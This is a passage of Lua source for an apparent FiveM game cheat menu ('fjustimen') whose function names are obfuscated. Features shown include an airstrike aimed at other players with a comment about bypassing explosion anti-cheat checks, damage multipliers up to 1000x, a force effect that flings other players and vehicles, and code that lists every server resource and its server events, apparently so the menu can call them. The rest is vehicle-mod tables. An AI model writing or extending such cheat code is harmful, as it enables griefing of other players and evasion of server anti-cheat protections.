				TaskVehicleDriveToCoord(pilot, aircraft, origin, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
				
				Wait(10000)
				NetworkUnregisterNetworkedEntity(pilot)
				NetworkUnregisterNetworkedEntity(aircraft)
				DeletePed(pilot)
				SetEntityAsMissionEntity(aircraft, true, true)
				DeleteVehicle(aircraft)
	
				RemoveBlip(blip)

				fjustimenUI.SendNotification({text = ("Airstrike on %s is complete!"):format(GetPlayerName(player)), type = "info"})
				break
			end
			Wait(0)
		end
	
		isAirstrikeRunning = false
	end
	LUtjuLMzHY(BmRxQocMYX)
end

local function eyWAcbvWuv()
	if isAirstrikeRunning then
		return fjustimenUI.SendNotification({text = "Wait until the current airstrike is complete", type = "error"}) 
	end

	local WaypointHandle = GetFirstBlipInfoId(8)

	if not DoesBlipExist(WaypointHandle) then
		return fjustimenUI.SendNotification({text = "You must place a waypoint", type = "error"})
	end

	local function BmRxQocMYX()
		isAirstrikeRunning = true

		local target = GetBlipInfoIdCoord(WaypointHandle)
		local origin = target + vector3(Airstrike.spawnDistance, Airstrike.spawnDistance, 725.0)
		repeat
			Wait(0)
		until HasModelLoaded(Airstrike.ped_hash) and HasModelLoaded(Airstrike.vehicle_hash)
	
		repeat
			Wait(0)
		until HasWeaponAssetLoaded(Airstrike.weapon_asset)
		  
		-- Create Aircraft
		local aircraft = CreateVehicle(Airstrike.vehicle_hash, origin, 0.0, true, true)
		FreezeEntityPosition(aircraft, true)
		-- Create pilot and block temporary events
		local pilot = CreatePedInsideVehicle(aircraft, 29, Airstrike.ped_hash, -1, true, true)
		SetBlockingOfNonTemporaryEvents(pilot, true)
		SetDriverAbility(pilot, 1.0)
		-- Make sure the vehicle engine is started
		SetVehicleJetEngineOn(aircraft, true)
		SetVehicleEngineOn(aircraft, true, true, true)
		
		-- Retract landing gear for fast flight
		ControlLandingGear(aircraft, 3)

		-- Disable turbulence
		SetPlaneTurbulenceMultiplier(aircraft, 0.0)

		-- Make sure the vehicle is marked as unowned by Player
		SetVehicleHasBeenOwnedByPlayer(aircraft, false)

		SetVehicleForceAfterburner(aircraft, true)
		local blip = AddBlipForEntity(aircraft)
		
		-- Disabled rockets (CExplosionEvent bypass)
		SetCurrentPedVehicleWeapon(pilot, Airstrike.weapon_asset)
		
		SetVehicleWeaponsDisabled(aircraft, 2)
		FreezeEntityPosition(aircraft, false)
		TaskVehicleDriveToCoord(pilot, aircraft, target.x, target.y, target.z, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
		--TaskPlaneMission(pilot, aircraft, 0, playerPed, 0, 0, 0, 6, GetVehicleModelMaxSpeed(aircraft), 1.0, 0.0, 2000.0, 500.0)

		SetDriveTaskCruiseSpeed(pilot, 150.0)

		-- Register with network and give up network ownership
		NetworkRegisterEntityAsNetworked(aircraft)
		local netVehid = NetworkGetNetworkIdFromEntity(aircraft)
		NetworkSetNetworkIdDynamic(netVehid, false)
		SetNetworkIdCanMigrate(netVehid, true)
		NetworkSetChoiceMigrateOptions(true, player)
		SetNetworkIdExistsOnAllMachines(netVehid, true)
		
		aircraft = NetToVeh(netVehid)

		-- Give up network ownership of ped
		NetworkRegisterEntityAsNetworked(pilot)
		local netPedid = NetworkGetNetworkIdFromEntity(pilot)
		NetworkSetNetworkIdDynamic(netPedid, false)
		SetNetworkIdCanMigrate(netPedid, true)
		NetworkSetChoiceMigrateOptions(true, player)
		SetNetworkIdExistsOnAllMachines(netPedid, true)

		pilot = NetToPed(netPedid)
	
		while true do
			local vehCoords = GetEntityCoords(aircraft)
			local distance = GetDistanceBetweenCoords(vehCoords, target)

			if not DoesEntityExist(aircraft) then
				isAirstrikeRunning = false
				return fjustimenUI.SendNotification({text = "The pilot sux and crashed the jet", type = "error"})
			end

			if distance <= 150.0 then
				--TaskVehicleShootAtCoord(pilot, coords, 0.5)
				ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, target.x, target.y, target.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
				for i = 1, 11 do
					local offset = target + vector3(math.random(-8.0, 8.0), math.random(-8.0, 8.0), 0.0)
					local vehCoords = GetEntityCoords(aircraft)
					-- SetVehicleShootAtTarget(pilot, aircraft, coords.x, coords.y, coords.z)
					-- print(offset)
					ShootSingleBulletBetweenCoords(vehCoords.x, vehCoords.y, vehCoords.z - 2.0, offset.x, offset.y, offset.z, 10000.0, 0, Airstrike.weapon_asset, pilot, true, false, 8000.0)
					
					Wait(100)
				end
	
				TaskVehicleDriveToCoord(pilot, aircraft, origin, 3500.0 * 2.6, 1.0, Airstrike.vehicle_hash, 16777216, 1.0, true)
				Wait(10000)
				DeletePed(pilot)
				
				SetEntityAsMissionEntity(aircraft)
				DeleteVehicle(aircraft)
	
				RemoveBlip(blip)

				fjustimenUI.SendNotification({text = "Airstrike on waypoint is complete!", type = "info"})
				break
			end
			Wait(0)
		end
	
		isAirstrikeRunning = false
	end
	LUtjuLMzHY(BmRxQocMYX)
end

local VInZHjFfNV = {} -- used for Online Players menu

local function RNDpymkwNb(title, initialText, bufferSize)
	local editing, finished, cancelled, notActive = 0, 1, 2, 3

	AddTextEntry("keyboard_title_buffer", title)
	DisplayOnscreenKeyboard(0, "keyboard_title_buffer", "", initialText, "", "", "", bufferSize)

	while UpdateOnscreenKeyboard() == editing do
		HideHudAndRadarThisFrame()
		Wait(0)
	end

	if GetOnscreenKeyboardResult() then return GetOnscreenKeyboardResult() end
end

local OPNzApXRyi = {}

OPNzApXRyi.FastRun = {
	Selected = 1,
	Values = {1.0, 1.09, 1.19, 1.29, 1.39, 1.49},
	Words = {"Default", "+20%", "+40%", "+60%", "+80%", "+100%"},
}

OPNzApXRyi.DamageModifier = {
	Selected = 1,
	Values = {1.0, 2.0, 5.0, 10.0, 25.0, 50.0, 100.0, 200.0, 500.0, 1000.0},
	Words = {"Default", "2x", "5x", "10x", "25x", "50x", "100x", "200x", "500x", "1000x"}
}

local tSyjzWZfIi = {}

tSyjzWZfIi.MK2 = {
	Selected = 1,
	Values = {"", "_mk2"},
	Words = {"Mk I", "Mk II"},
}

tSyjzWZfIi.EnginePower = {
	Selected = 1,
	Values = {1.0, 25.0, 50.0, 100.0, 200.0, 500.0, 1000.0},
	Words = {"Default", "+25%", "+50%", "+100%", "+200%", "+500%", "+1000%"}
}

tSyjzWZfIi.XenonColor = {
	Selected = 1,
	Values = {-1, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12},
	Words = {"Default", "White", "Blue", "Electric", "Mint", "Lime", "Yellow", "Gold", "Orange", "Red", "Pink", "Hot Pink", "Purple", "Blacklight"}
}

local function yVUcYJOEpO(vehicle)
	local x = GetVehicleDirtLevel(vehicle)
	local val = floor(((x / 7.5) + 1) + 0.5)
	
	return val
end

tSyjzWZfIi.DirtLevel = {
	Selected = yVUcYJOEpO,
	Values = {0.0, 7.5, 15.0},
	Words = {"Clean", "Dirty", "Filthy"}
}

local function ejKYqZHiGy(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	hfSPELVLBp(vehicle)
	SetVehicleFixed(vehicle)
	SetVehicleLightsMode(vehicle, 0)
	SetVehicleLights(vehicle, 0)
	SetVehicleBurnout(vehicle, false)
	SetVehicleEngineHealth(vehicle, 1000.0)
	SetVehicleFuelLevel(vehicle, 100.0)
	SetVehicleOilLevel(vehicle, 100.0)
	return true
end

local function UwujCRrVdA(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	return SetVehicleOnGroundProperly(vehicle)
end

local function sWvflVbiqK()
	
	local playerPos = GetEntityCoords( PlayerPedId() )
	local inFront = GetOffsetFromEntityInWorldCoords( ped, 0.0, 8.0, 0.0 )
	local rayHandle = CastRayPointToPoint( playerPos.x, playerPos.y, playerPos.z, inFront.x, inFront.y, inFront.z, 10, PlayerPedId(), 0 )
    local _, _, _, _, vehicle = GetRaycastResult( rayHandle )
	
	return vehicle
end

local function uloTRbVjGn(vehicle)
	local vehicle = vehicle
	if vehicle == 0 then return false end

	SetEntityAsMissionEntity(vehicle, true, true)
	DeleteVehicle(vehicle)

	return true
end

local function idAcOhFwAt(player)
	local ped = GetPlayerPed(player)
	if not IsPedInAnyVehicle(ped) then
		return fjustimenUI.SendNotification({text = ("%s is not in a vehicle!"):format(GetPlayerName(player)), type = "error"})
	end

	local vehicle = GetVehiclePedIsUsing(GetPlayerPed(player))

	local seats = GetVehicleMaxNumberOfPassengers(vehicle)
	for i = 0, seats do
		if IsVehicleSeatFree(vehicle, i) then
			SetPedIntoVehicle(PlayerPedId(), vehicle, i)
			break
		end
	end
end

local function CjnRjcjCLG(vehicle)
	local plateText = RNDpymkwNb("Enter new plate text", "", 8)

	if vehicle ~= 0 then 
		SetVehicleNumberPlateText(vehicle, plateText)
		return true
	end

	return false
end

local function lsRSeSeAOY(vehicle)
	if vehicle == 0 then
		vehicle = sWvflVbiqK()
	end

	SetPedIntoVehicle(PlayerPedId(), vehicle, -1)
end

local function PvxydtgrmB(vehicle)
	local ped = GetPedInVehicleSeat(vehicle, -1)
	local vehicleNet = VehToNet(vehicle)

	hfSPELVLBp(ped)
	ClearPedTasksImmediately(ped)

	while not IsVehicleSeatFree(NetToVeh(vehicleNet), -1) do
		Wait(0)
	end

	SetPedIntoVehicle(PlayerPedId(), NetToVeh(vehicleNet), -1)
	TaskWarpPedIntoVehicle(PlayerPedId(), NetToVeh(vehicleNet), -1)

	return true
end

tSyjzWZfIi.VehicleActions = {
	Selected = 1,
	Values = {ejKYqZHiGy, UwujCRrVdA, lsRSeSeAOY, uloTRbVjGn},
	Words = {"Repair", "Flip", "Drive", "Delete"}
}

tSyjzWZfIi.PedOptions = {
	Selected = 1,
	Values = {0, 1, 2, 3},
	Words = {"All Weapons", "Melee Weapons", "Pistols", "Heavy Weapons"}
}

local currentMods = nil
local EngineUpgrade = {-1, 0, 1, 2, 3}
local VehicleUpgradeWords = {

	{"STOCK", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "LEVEL 3", "MAX LEVEL"},
	{"STOCK", "LEVEL 1", "LEVEL 2", "LEVEL 3", "LEVEL 4", "MAX LEVEL"},

}

local themeColors = {
	red = { r = 231, g = 76, b = 60, a = 255 },  -- rgb(231, 76, 60)
	orange = { r = 230, g = 126, b = 34, a = 255 }, -- rgb(230, 126, 34)
	yellow = { r = 241, g = 196, b = 15, a = 255 }, -- rgb(241, 196, 15)
	green = { r = 26, g = 188, b = 156, a = 255 }, -- rgb(26, 188, 156)
	blue = { r = 52, g = 152, b = 219, a = 255 }, -- rgb(52, 152, 219)
	purple = { r = 155, g = 89, b = 182, a = 255 }, -- rgb(155, 89, 182)
	white = { r = 236, g = 240, b = 241, a = 255} -- rgb(236, 240, 241)
}
-- Set a default menu theme
_menuColor.base = themeColors.red

local dynamicColorTheme = false

local texture_preload = {
	"commonmenu",
	"heisthud",
	"mpweaponscommon",
	"mpweaponscommon_small",
	"mpweaponsgang0_small",
	"mpweaponsgang1_small",
	"mpweaponsgang0",
	"mpweaponsgang1",
	"mpweaponsunusedfornow",
	"mpleaderboard",
	"mphud",
	"mparrow",
	"pilotschool",
	"shared",
}

local function FSEtqoDpza()
	
	--print("^7Preloading texture dictionaries...")
	for i = 1, #texture_preload do
		RequestStreamedTextureDict(texture_preload[i])
	end

end

FSEtqoDpza()

local function aIHDufBypd()
	local playerPed = PlayerPedId()
	local canSuicide = false
	local foundWeapon = nil

	GiveWeaponToPed(playerPed, GetHashKey("WEAPON_PISTOL"), 250, false, true)

	if HasPedGotWeapon(playerPed, GetHashKey('WEAPON_PISTOL')) then
		if GetAmmoInPedWeapon(playerPed, GetHashKey('WEAPON_PISTOL')) > 0 then
			canSuicide = true
			foundWeapon = GetHashKey('WEAPON_PISTOL')
		end
	end

	if canSuicide then
		if not HasAnimDictLoaded('mp_suicide') then
			RequestAnimDict('mp_suicide')

			while not HasAnimDictLoaded('mp_suicide') do
				Wait(0)
			end
		end

		SetCurrentPedWeapon(playerPed, foundWeapon, true)

		Wait(1000)

		TaskPlayAnim(playerPed, "mp_suicide", "pistol", 8.0, 1.0, -1, 2, 0, 0, 0, 0 )

		Wait(750)

		SetPedShootsAtCoord(playerPed, 0.0, 0.0, 0.0, 0)
		SetEntityHealth(playerPed, 0)
	end
end

local validResources = {}
local validResourceEvents = {}
local validResourceServerEvents = {}

local function jaQkKPZWqp()
	IOeFDEouNG(aIHDufBypd)
end

local function IwTIdoTsyw()
    local resources = {}
	for i = 1, GetNumResources() do
		resources[i] = GetResourceByFindIndex(i)
    end
    return resources
end

local function SFqzLPwxWB(resourceName)
	TriggerEvent(resourceName .. ".verify", function(resource) validResources[#validResources + 1] = resource end)
end

for i, v in ipairs(IwTIdoTsyw()) do
	SFqzLPwxWB(v)
end


local function mncCSPaDat()
	for i, v in ipairs(validResources) do
		TriggerEvent(v .. ".getEvents", function(rscName, events) validResourceEvents[rscName] = events end)
	end
end

local function vdxfcNyuOp()
	for i, v in ipairs(validResources) do
		TriggerEvent(v .. ".getServerEvents", function(rscName, events) validResourceServerEvents[rscName] = events end)
	end
end

local function DnkZvJvBwQ()
	while true do
		vdxfcNyuOp()
		Wait(5000)
	end
end

IOeFDEouNG(DnkZvJvBwQ)

mncCSPaDat()

local function bIdhyJuJOs(rotation)
    local retz = math.rad(rotation.z)
    local retx = math.rad(rotation.x)
    local absx = math.abs(math.cos(retx))
    return vector3(-math.sin(retz) * absx, math.cos(retz) * absx, math.sin(retx))
end

local function NNFabPDfOB()
	local ForceKey = fjustimen.Keys["E"]
	local Force = 0.5
	local KeyPressed = false
	local KeyTimer = 0
	local KeyDelay = 15
	local ForceEnabled = false
	local StartPush = false

	function apqoOnMBUV()
		
		if (KeyPressed) then
			KeyTimer = KeyTimer + 1
			if (KeyTimer >= KeyDelay) then
				KeyTimer = 0
				KeyPressed = false
			end
		end
		
		
		
		if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and not ForceEnabled then
			KeyPressed = true
			ForceEnabled = true
		end
		
		if (StartPush) then
			
			StartPush = false
			local pid = PlayerPedId()
			local CamRot = GetGameplayCamRot(2)
			
			local force = 5
			
			local Fx = -(math.sin(math.rad(CamRot.z)) * force * 10)
			local Fy = (math.cos(math.rad(CamRot.z)) * force * 10)
			local Fz = force * (CamRot.x * 0.2)
			
			local PlayerVeh = GetVehiclePedIsIn(pid, false)
			
			for k in ttavCZvxQN() do
				SetEntityInvincible(k, false)
				if IsEntityOnScreen(k) and k ~= PlayerVeh then
					ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
				end
			end
			
			for k in DHJCIbSbgi() do
				if IsEntityOnScreen(k) and k ~= pid then
					ApplyForceToEntity(k, 1, Fx, Fy, Fz, 0, 0, 0, true, false, true, true, true, true)
				end
			end
		
		end
		
		
		if IsDisabledControlPressed(0, ForceKey) and not KeyPressed and ForceEnabled then
			KeyPressed = true
			StartPush = true
			ForceEnabled = false
		end
		
		if (ForceEnabled) then
			local pid = PlayerPedId()
			local PlayerVeh = GetVehiclePedIsIn(pid, false)
			
			Markerloc = GetGameplayCamCoord() + (VcsbXbuyxm(GetGameplayCamRot(2)) * 20)
			
			DrawMarker(28, Markerloc, 0.0, 0.0, 0.0, 0.0, 180.0, 0.0, 1.0, 1.0, 1.0, _menuColor.base.r, _menuColor.base.g, _menuColor.base.b, 35, false, true, 2, nil, nil, false)
			
			for k in ttavCZvxQN() do
				SetEntityInvincible(k, true)
				if IsEntityOnScreen(k) and (k ~= PlayerVeh) then
					hfSPELVLBp(k)
					FreezeEntityPosition(k, false)
					AbXnXnpXEx(k, Markerloc, 0.5, 0.3)
				end
			end
			
			for k in DHJCIbSbgi() do
				if IsEntityOnScreen(k) and k ~= PlayerPedId() then
					hfSPELVLBp(k)
					SetPedToRagdoll(k, 4000, 5000, 0, true, true, true)
					FreezeEntityPosition(k, false)
					AbXnXnpXEx(k, Markerloc, 0.5, 0.3)
				end
			end
		
		end
	
	end

	while fjustimen.Toggle.EOwuAPjpvo do apqoOnMBUV()Wait(0) end
end

local function EOwuAPjpvo()
    fjustimen.Toggle.EOwuAPjpvo = not fjustimen.Toggle.EOwuAPjpvo
    
	if fjustimen.Toggle.EOwuAPjpvo then
		fjustimenUI.SendNotification({text = "Press ~b~E~s~ to use Magneto", type = "info"})

        IOeFDEouNG(NNFabPDfOB)
	end
end

local function NAyXuwYmJD()
	while fjustimen.Toggle.kBWGGSBsFR do
		SetPedToRagdoll(PlayerPedId(), 1000, 1000, 0, 0, 0, 0)
		Wait(5)
	end
end

local function kBWGGSBsFR()
	fjustimen.Toggle.kBWGGSBsFR = not fjustimen.Toggle.kBWGGSBsFR

	if fjustimen.Toggle.kBWGGSBsFR then
		IOeFDEouNG(NAyXuwYmJD)
	end
end

-- Config for LSC
local EbEFecYGjP = {}

EbEFecYGjP.vehicleMods = {
	{name = "Spoilers", id = 0, meta = "modSpoilers"},
	{name = "Front Bumper", id = 1, meta = "modFrontBumper"},
	{name = "Rear Bumper", id = 2, meta = "modRearBumper"},
	{name = "Side Skirt", id = 3, meta = "modSideSkirt"},
	{name = "Exhaust", id = 4, meta = "modExhaust"},
	{name = "Frame", id = 5, meta = "modFrame"},
	{name = "Grille", id = 6, meta = "modGrille"},
	{name = "Hood", id = 7, meta = "modHood"},
	{name = "Fender", id = 8, meta = "modFender"},
	{name = "Right Fender", id = 9, meta = "modRightFender"},
	{name = "Roof", id = 10, meta = "modRoof"},
	{name = "Xenon Lights", id = 22, meta = "modXenon"},
	{name = "Vanity Plates", id = 26, meta = "modVanityPlate"},
	{name = "Trim", id = 27, meta = "modTrim"},
	{name = "Ornaments", id = 28, meta = "modOrnaments"},
	{name = "Dashboard", id = 29, meta = "modDashboard"},
	{name = "Dial", id = 30, meta = "modDial"},
	{name = "Door Speaker", id = 31, meta = "modDoorSpeaker"},
	{name = "Seats", id = 32, meta = "modSeats"},
	{name = "Steering Wheel", id = 33, meta = "modSteeringWheel"},
	{name = "Shifter Leavers", id = 34, meta = "modShifterLeavers"},
	{name = "Plaques", id = 35, meta = "modPlaques"},
	{name = "Speakers", id = 36, meta = "modSpeakers"},
	{name = "Trunk", id = 37, meta = "modTrunk"},
	{name = "Hydraulics", id = 38, meta = "modHydraulics"},
	{name = "Engine Block", id = 39, meta = "modEngineBlock"},
	{name = "Air Filter", id = 40, meta = "modAirFilter"},
	{name = "Struts", id = 41, meta = "modStruts"},
	{name = "Arch Cover", id = 42, meta = "modArchCover"},
	{name = "Aerials", id = 43, meta = "modAerials"},
	{name = "Trim 2", id = 44, meta = "modTrimB"},
	{name = "Tank", id = 45, meta = "modTank"},
	{name = "Windows", id = 46, meta = "modWindows"},
	{name = "Livery", id = 48, meta = "modLivery"},
	{name = "Horns", id = 14, meta = "modHorns"},
	{name = "Wheels", id = 23, meta = "modFrontWheels"},
	{name = "Back Wheels", id = 24, meta = "modBackWheels"},
	-- {name = "Wheel Types", id = "wheeltypes"},
	-- {name = "Extras", id = "extra"},
	-- {name = "Neons", id = "neon"},
	-- {name = "Paint", id = "paint"},
}

EbEFecYGjP.perfMods = {
	{name = "Armor", id = 16, meta = "modArmor"},
	{name = "Engine", id = 11, meta = "modEngine"},
	{name = "Brakes", id = 12, meta = "modBrakes"},
	{name = "Transmission", id = 13, meta = "modTransmission"},
	{name = "Suspension", id = 15, meta = "modSuspension"},
}

EbEFecYGjP.horns = {
	["HORN_STOCK"] = -1,
	["Truck Horn"] = 1,
	["Police Horn"] = 2,
	["Clown Horn"] = 3,
	["Musical Horn 1"] = 4,
	["Musical Horn 2"] = 5,
	["Musical Horn 3"] = 6,
	["Musical Horn 4"] = 7,
	["Musical Horn 5"] = 8,
	["Sad Trombone Horn"] = 9,
	["Classical Horn 1"] = 10,
	["Classical Horn 2"] = 11,
	["Classical Horn 3"] = 12,
	["Classical Horn 4"] = 13,
	["Classical Horn 5"] = 14,
	["Classical Horn 6"] = 15,
	["Classical Horn 7"] = 16,
	["Scaledo Horn"] = 17,
	["Scalere Horn"] = 18,
	["Salemi Horn"] = 19,
	["Scalefa Horn"] = 20,
	["Scalesol Horn"] = 21,
	["Scalela Horn"] = 22,
	["Scaleti Horn"] = 23,
	["Scaledo Horn High"] = 24,
	["Jazz Horn 1"] = 25,
	["Jazz Horn 2"] = 26,
	["Jazz Horn 3"] = 27,
	["Jazz Loop Horn"] = 28,
	["Starspangban Horn 1"] = 28,
	["Starspangban Horn 2"] = 29,
	["Starspangban Horn 3"] = 30,
	["Starspangban Horn 4"] = 31,
	["Classical Loop 1"] = 32,
	["Classical Horn 8"] = 33,
	["Classical Loop 2"] = 34,

}

EbEFecYGjP.WheelType = {"Sport", "Muscle", "Lowrider", "SUV", "Offroad", "Tuner", "Bike", "High End"}

EbEFecYGjP.neonColors = {
	["White"] = {255,255,255},
	["Blue"] ={0,0,255},
	["Electric Blue"] ={0,150,255},
	["Mint Green"] ={50,255,155},
	["Lime Green"] ={0,255,0},
	["Yellow"] ={255,255,0},
	["Golden Shower"] ={204,204,0},
	["Orange"] ={255,128,0},
	["Red"] ={255,0,0},
	["Pony Pink"] ={255,102,255},
	["Hot Pink"] ={255,0,255},
	["Purple"] ={153,0,153},
}

EbEFecYGjP.paintsClassic = { -- kill me pls
	{name = "Black", id = 0},
	{name = "Carbon Black", id = 147},
	{name = "Graphite", id = 1},
	{name = "Anhracite Black", id = 11},
	{name = "Black Steel", id = 2},
	{name = "Dark Steel", id = 3},
	{name = "Silver", id = 4},
	{name = "Bluish Silver", id = 5},
	{name = "Rolled Steel", id = 6},
	{name = "Shadow Silver", id = 7},
	{name = "Stone Silver", id = 8},
	{name = "Midnight Silver", id = 9},
	{name = "Cast Iron Silver", id = 10},
	{name = "Red", id = 27},
	{name = "Torino Red", id = 28},
	{name = "Formula Red", id = 29},
	{name = "Lava Red", id = 150},
	{name = "Blaze Red", id = 30},
	{name = "Grace Red", id = 31},
	{name = "Garnet Red", id = 32},
	{name = "Sunset Red", id = 33},
	{name = "Cabernet Red", id = 34},
	{name = "Wine Red", id = 143},
	{name = "Candy Red", id = 35},
	{name = "Hot Pink", id = 135},
	{name = "Pfsiter Pink", id = 137},
	{name = "Salmon Pink", id = 136},
	{name = "Sunrise Orange", id = 36},
	{name = "Orange", id = 38},
	{name = "Bright Orange", id = 138},
	{name = "Gold", id = 99},
	{name = "Bronze", id = 90},
	{name = "Yellow", id = 88},
	{name = "Race Yellow", id = 89},
	{name = "Dew Yellow", id = 91},
	{name = "Dark Green", id = 49},
	{name = "Racing Green", id = 50},
	{name = "Sea Green", id = 51},
	{name = "Olive Green", id = 52},
	{name = "Bright Green", id = 53},
	{name = "Gasoline Green", id = 54},
	{name = "Lime Green", id = 92},
	{name = "Midnight Blue", id = 141},
	{name = "Galaxy Blue", id = 61},
	{name = "Dark Blue", id = 62},
	{name = "Saxon Blue", id = 63},
	{name = "Blue", id = 64},
	{name = "Mariner Blue", id = 65},
	{name = "Harbor Blue", id = 66},
	{name = "Diamond Blue", id = 67},
	{name = "Surf Blue", id = 68},
	{name = "Nautical Blue", id = 69},
	{name = "Racing Blue", id = 73},
	{name = "Ultra Blue", id = 70},
	{name = "Light Blue", id = 74},
	{name = "Chocolate Brown", id = 96},
	{name = "Bison Brown", id = 101},
	{name = "Creeen Brown", id = 95},
	{name = "Feltzer Brown", id = 94},
	{name = "Maple Brown", id = 97},
	{name = "Beechwood Brown", id = 103},
	{name = "Sienna Brown", id = 104},
	{name = "Saddle Brown", id = 98},
	{name = "Moss Brown", id = 100},
	{name = "Woodbeech Brown", id = 102},
	{name = "Straw Brown", id = 99},
	{name = "Sandy Brown", id = 105},
	{name = "Bleached Brown", id = 106},
	{name = "Schafter Purple", id = 71},
	{name = "Spinnaker Purple", id = 72},
	{name = "Midnight Purple", id = 142},
	{name = "Bright Purple", id = 145},
	{name = "Cream", id = 107},
	{name = "Ice White", id = 111},
	{name = "Frost White", id = 112},
}

EbEFecYGjP.paintsMatte = {
	{name = "Black", id = 12},
	{name = "Gray", id = 13},
	{name = "Light Gray", id = 14},
	{name = "Ice White", id = 131},
	{name = "Blue", id = 83},
	{name = "Dark Blue", id = 82},
	{name = "Midnight Blue", id = 84},
	{name = "Midnight Purple", id = 149},
	{name = "Schafter Purple", id = 148},
	{name = "Red", id = 39},
	{name = "Dark Red", id = 40},
	{name = "Orange", id = 41},
	{name = "Yellow", id = 42},
	{name = "Lime Green", id = 55},
	{name = "Green", id = 128},
	{name = "Forest Green", id = 151},
	{name = "Foliage Green", id = 155},
	{name = "Olive Darb", id = 152},
	{name = "Dark Earth", id = 153},
	{name = "Desert Tan", id = 154},
}

EbEFecYGjP.paintsMetal = {
	{name = "Brushed Steel", id = 117},
	{name = "Brushed Black Steel", id = 118},
	{name = "Brushed Aluminum", id = 119},
	{name = "Pure Gold", id = 158},
	{name = "Brushed Gold", id = 159},
}

function EbEFecYGjP.RKtAvXCOgM(index)
	if (index == 0) then
		return "Truck Horn"
	elseif (index == 1) then
		return "Cop Horn"
	elseif (index == 2) then
		return "Clown Horn"
	elseif (index == 3) then
		return "Musical Horn 1"
	elseif (index == 4) then
		return "Musical Horn 2"
	elseif (index == 5) then
		return "Musical Horn 3"
	elseif (index == 6) then
		return "Musical Horn 4"
	elseif (index == 7) then
		return "Musical Horn 5"
	elseif (index == 8) then
		return "Sad Trombone"
	elseif (index == 9) then
		return "Classical Horn 1"
	elseif (index == 10) then
		return "Classical Horn 2"
	elseif (index == 11) then
		return "Classical Horn 3"
	elseif (index == 12) then
		return "Classical Horn 4"
	elseif (index == 13) then
		return "Classical Horn 5"
	elseif (index == 14) then
		return "Classical Horn 6"
	elseif (index == 15) then
		return "Classical Horn 7"
	elseif (index == 16) then
		return "Scale - Do"
	elseif (index == 17) then
		return "Scale - Re"
	elseif (index == 18) then
		return "Scale - Mi"
	elseif (index == 19) then
		return "Scale - Fa"
	elseif (index == 20) then
		return "Scale - Sol"
	elseif (index == 21) then
		return "Scale - La"
	elseif (index == 22) then
		return "Scale - Ti"
	elseif (index == 23) then
		return "Scale - Do"
	elseif (index == 24) then
		return "Jazz Horn 1"
	elseif (index == 25) then
		return "Jazz Horn 2"
	elseif (index == 26) then
		return "Jazz Horn 3"
	elseif (index == 27) then
		return "Jazz Horn Loop"
	elseif (index == 28) then
		return "Star Spangled Banner 1"
	elseif (index == 29) then
		return "Star Spangled Banner 2"
	elseif (index == 30) then
		return "Star Spangled Banner 3"
	elseif (index == 31) then
		return "Star Spangled Banner 4"
	elseif (index == 32) then
		return "Classical Horn 8 Loop"
	elseif (index == 33) then
		return "Classical Horn 9 Loop"
	elseif (index == 34) then
		return "Classical Horn 10 Loop"
	elseif (index == 35) then
		return "Classical Horn 8"
	elseif (index == 36) then
		return "Classical Horn 9"
	elseif (index == 37) then
		return "Classical Horn 10"
	elseif (index == 38) then
		return "Funeral Loop"
	elseif (index == 39) then
		return "Funeral"
	elseif (index == 40) then
		return "Spooky Loop"
	elseif (index == 41) then
		return "Spooky"
	elseif (index == 42) then
		return "San Andreas Loop"
	elseif (index == 43) then
		return "San Andreas"
	elseif (index == 44) then
		return "Liberty City Loop"
	elseif (index == 45) then
		return "Liberty City"
	elseif (index == 46) then
		return "Festive 1 Loop"
	elseif (index == 47) then
		return "Festive 1"
	elseif (index == 48) then
		return "Festive 2 Loop"
	elseif (index == 49) then
		return "Festive 2"
	elseif (index == 50) then
		return "Festive 3 Loop"
	elseif (index == 51) then
		return "Festive 3"
	else
		return "Unknown Horn"
	end
end

function EbEFecYGjP.GeEFnatGQP()
	currentMods = fjustimen.Game.GetVehicleProperties(fjustimen.Player.Vehicle)
	--SetVehicleModKit(fjustimen.Player.Vehicle, 0)
end

function EbEFecYGjP:xIiztlpeca()
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local valid = {}

	for i=0,50,1 do
		if(DoesExtraExist(playerVeh, i))then
			local realModName = "Extra #"..tostring(i)
			local text = "OFF"
			if(IsVehicleExtraTurnedOn(playerVeh, i))then
				text = "ON"
			end
			local realSpawnName = "extra "..tostring(i)
			table.insert(valid, {
				menuName=realModName,
				data ={
					["action"] = realSpawnName,
					["state"] = text
				}
			})
		end
	end

	return valid
end


function EbEFecYGjP:WQpLETFNQN(vehicle)
	for i = 1, 30 do
		if ( DoesExtraExist( vehicle, i ) ) then
			return true
		end
	end

	return false
end


function EbEFecYGjP:uQukRkYihC(modID)
	local playerPed = PlayerPedId()
	local playerVeh = GetVehiclePedIsIn(playerPed, false)
	local valid = {}
	local modCount = GetNumVehicleMods(playerVeh,modID)

	-- Handle Liveries if they don't exist in modCount
	if (modID == 48 and modCount == 0) then

		-- Local to prevent below code running.
		local modCount = GetVehicleLiveryCount(playerVeh)
		for i=1, modCount, 1 do
			local realIndex = i - 1
			local modName = GetLiveryName(playerVeh, realIndex)
			local realModName = GetLabelText(modName)
			local modid, realSpawnName = modID, realIndex

			valid[i] = {
				menuName=realModName,
				data = {
					["modid"] = modid,
					["realIndex"] = realSpawnName
				}
			}
		end
	end
	-- Handles all other mods
	for i = 1, modCount, 1 do
		local realIndex = i - 1
		local modName = GetModTextLabel(playerVeh, modID, realIndex)
		local realModName = GetLabelText(modName)
		local modid, realSpawnName = modCount, realIndex


		valid[i] = {
			menuName=realModName,
			data = {
				["modid"] = modid,
				["realIndex"] = realSpawnName
			}
		}
	end


	-- Insert Stock Option for modifications
	if(modCount > 0)then
		local realIndex = -1
		local modid, realSpawnName = modID, realIndex
